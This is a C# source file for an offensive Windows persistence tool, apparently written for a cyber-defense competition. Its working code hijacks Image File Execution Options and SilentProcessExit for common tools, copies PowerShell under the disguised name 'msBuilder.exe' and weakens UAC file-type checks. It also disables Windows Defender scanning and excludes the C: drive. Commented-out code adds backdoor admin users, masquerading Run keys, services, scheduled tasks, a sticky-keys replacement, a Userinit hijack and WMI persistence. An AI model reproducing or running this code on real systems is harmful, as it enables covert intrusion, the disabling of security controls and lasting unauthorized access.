using System;
using System.Configuration;
using System.Collections.Specialized;
using System.Collections.Generic;
using Microsoft.Win32;

/*
 *  TODO: Implement yaml configuration parser 
 *  TODO: Implement non-registry persistence mechanism, such as bitsadmin 
 *  TODO: Get code review and audit from other colleagues  
 */


namespace ezclap
{
    class Program
    {
        // Something to parse a yaml file and feed all the configuration into the persistence in main function 

        public static void modifyImageFileExec(string payload)
        {

            RegistryKey imageFileExecKey = Registry.LocalMachine.OpenSubKey(RegistryKeys.hklmImageFileExec);
            string[] targetExec = new string[] { "notepad.exe", "taskmgr.exe", "Autoruns64.exe", "Autoruns.exe", "chrome.exe", "powershell.exe", "cmd.exe" };
            foreach (string target in targetExec)
            {
                string finalImageFileExec = RegistryKeys.hklmImageFileExec + "\\" + target;
                Utils.setHKLMSubKey(finalImageFileExec, "GlobalFlag", 512);

                string finalSilentProcExit = RegistryKeys.hklmSilentProcessExit + "\\" + target;
                Utils.setHKLMSubKey(finalSilentProcExit, "ReportingMode", 1);
                Utils.setHKLMSubKey(finalSilentProcExit, "MonitorProcess", payload);

            }
            /*  This is way too destructive and have a chance to bomb the box. Removing for now... 
            foreach (var v in imageFileExecKey.GetSubKeyNames() ) 
            {
                try{
                    string finalLocation = RegistryKeys.hklmImageFileExec + "\\" + v;
                    setHKLMSubKey(finalLocation, "GlobalFlag", 512);

                    string silentProcesExitFinal = RegistryKeys.hklmSilentProcessExit + "\\" + v;
                    setHKLMSubKey(silentProcesExitFinal, "ReportingMode", 1);
                    setHKLMSubKey(silentProcesExitFinal, "MonitorProcess", payload);
                }
                catch(Exception e){
                    continue;
                } 
            }
            */
        }

        public static void setup(string originPayloadLoc, string[] newLoc)
        {
            // 1. Copy powershell as msBuilder.exe 
            string srcPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
            string destPath = @"C:\Windows\System32\msBuilder.exe";
            System.IO.File.Copy(srcPath, destPath, true);

            // 2. change LowRiskFileTypes to bypass UAC 
            Utils.setHKCUSubKey(RegistryKeys.hkcuLowRiskFileType, "LowRiskFileTypes", ".bat;.exe;.ps1");
            //Console.WriteLine(RegistryKeys.hklmImagePath);

            // 3. Copy payload into different locations 
            List<string> payloadList = new List<string>();
            foreach (var destination in newLoc)
            {
                System.IO.File.Copy(originPayloadLoc, destination, true);
                payloadList.Add(destination);
            }

            // 4. Disable WinDefender
            string noRealTime = "Set-MpPreference -DisableRealTimeMonitoring $true -DisableScriptScanning $true -DisableIOAVProtection $true";
            string excludeC = "Add-MpPreference -ExclusionPath \"C:\"";
            
            System.Diagnostics.Process.Start(@"powershell.exe", noRealTime);
            System.Diagnostics.Process.Start(@"powershell.exe", excludeC);

           
        }

        private static void testConfig()
        {
            string[] WMIName = Utils.parseConfig("techniques/AddWMI", "name");
            Array.ForEach(WMIName, Console.WriteLine);

            string[] addUserPassword = Utils.parseConfig("techniques/AddUser", "password");
            Array.ForEach(addUserPassword, Console.WriteLine);

            string[] addUserGroups = Utils.parseConfig("techniques/AddUser", "groups");
            Array.ForEach(addUserGroups, Console.WriteLine);

            string[] scheduledTaskName = Utils.parseConfig("techniques/AddScheduledTask", "name");
            Array.ForEach(scheduledTaskName, Console.WriteLine);
        }

        static void Main(string[] args)
        {
            // Copy powershell to different name and use it as a payload 

            testConfig();
            
            Random rnd = new Random();

            string originalPayloadLoc = args[0];
            Console.WriteLine("[+] Using original payload: " + originalPayloadLoc);

            string[] payload = Utils.parseConfig("payload", "name");
            setup(originalPayloadLoc, payload);

            Console.WriteLine("[+] \n\nNew Payload locations\n ");
            Array.ForEach(payload, element => Console.WriteLine(element));



            // ########## Getting Configuration Strings #####################

            string[] WMIName = Utils.parseConfig("techniques/AddWMI", "name");
            Array.ForEach(WMIName, element => Console.WriteLine(element));
            AddWMI persistWMI = new AddWMI(WMIName, payload);

            Console.ReadLine();

            /*
            // 1. Setup 
            string[] payloadArray = setup(payload);
            Random rand = new Random();

            string runKeyPayload = "msBuilder.exe -ep bypass -nop -windowstyle hidden -c C:\\Users\\Administrator\\Desktop\\agent.exe";
            string[] names = new string[] { "Application_Security", "Backup", "Appsec", "Google Updates", "Microsoft_Credential_Guard", "duderino", "catchmeifyoucan" };
            AddRunKey persistRunKey = new AddRunKey(names, runKeyPayload);
            */

            /*
            foreach(var key in addUserConfig.AllKeys)
            {
                Console.WriteLine(key + " = " + addUserConfig[key]);
            }
            Console.WriteLine(payload);
            */

            /*
            //string[] domainAdmins = new string[] { "joe", "bob", "michael", "whiteteamer", "blackteamer", "scoringengine" };
            //string[] randomUsers = new string[] { "father", "son", "cattails", "watershell", "headshot", "detcord", "silenttrinity" };
            // =================================================================================================================

            string[] users = new string[] { "bob", "doe" };
            string[] groups = new string[] { "Domain Admins", "Administrators", "Enterprise Admins" };
            string password = "Password123!";
            string payload = "c:\\Users\\Administrator\\Desktop\\agent.exe";

            /*
             *  0. Setup 
             *      A) LowRiskFileTypes --> bypass bat, exe, ps1 
             *      B) Turn off windows defender completely --> Ask blackteam/redteam about if this is even needed 
             *      C) Enable winrm, Enable PSremoting, 
             *      D) Drop all firewall rules 
             

            
            Utils.setHKCUSubKey(RegistryKeys.hkcuLowRiskFileType, "LowRiskFileTypes", ".bat;.exe;.ps1");
            Console.WriteLine(RegistryKeys.hklmImagePath);

            // 0. Dropping payload, changing it to random names, timestomping, etc...

            
            // 1. Create Backdoor users 
            AddUser persistAddUser = new AddUser(users, password, groups);

            
            // 2. Create Runkey registry with payloads 
            string[] names = new string[] { "Application_Security", "Backup", "Appsec", "Google Updates", "Microsoft_Credential_Guard", "duderino", "catchmeifyoucan" };
            AddRunKey persistAddRunKey = new AddRunKey(names, payload);
            
            
            // 3. Create a malicious service --> Through sc? Or actually through installer route? 
            string easyServiceName = "ApplicationSecurity";
            AddService easyService = new AddService(easyServiceName, payload);
            //easyService.StartService(easyServiceName, 10000);

            
            // 4. Create scheduled task - Runs every 20 minutes 
            string scheduledTaskName = "GoogleUpdateTaskMachineMaster";
            string unicodeScheduledTaskName = "樂𐐷𐐷𐐷𐐷𐐷𐐷쀍승관𤭢𤭢𤭢𤭢𤭢𤭢𤭢𤭢𤭢𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𤭢𤭢𤭢𤭢𤭢𤭢𤭢樂쳌쳌쳌쳌쀍";
            AddScheduledTask task1 = new AddScheduledTask(scheduledTaskName, payload, 20.0);
            AddScheduledTask task2 = new AddScheduledTask(unicodeScheduledTaskName, payload, 20.0);

            // 5. Create startup folder persistence 

            // 6. Create utilman and sceth (sticky) persistence 
            string accessbilityPayload = "C:\\Windows\\System32\\cmd.exe";
            AddAccessibility persistAccess = new AddAccessibility(accessbilityPayload);

            
            // 7. Modify userinit 
            Utils.setHKLMSubKey(RegistryKeys.hklmUserInit, "Userinit", payload + ", C:\\Windows\\System32\\userinit.exe");

            // 8. Modify FailureCommand 
            List<string> servicesList = new List<string>();
            servicesList = Utils.getAllServices();
            AddFailureCommand persistFailureCommand = new AddFailureCommand(servicesList, payload);

            // 9. Modify Image File Execution             
            modifyImageFileExec(payload);
            
            // 10. AddWMI for persistence 
            string name = "ScoringEngine_worker";
            string WMIpayload = "C:\\Windows\\System32\\agent.exe";
            AddWMI persistWMI = new AddWMI(name, WMIpayload);
            

            Console.ReadLine();
            */
        }
    }
}
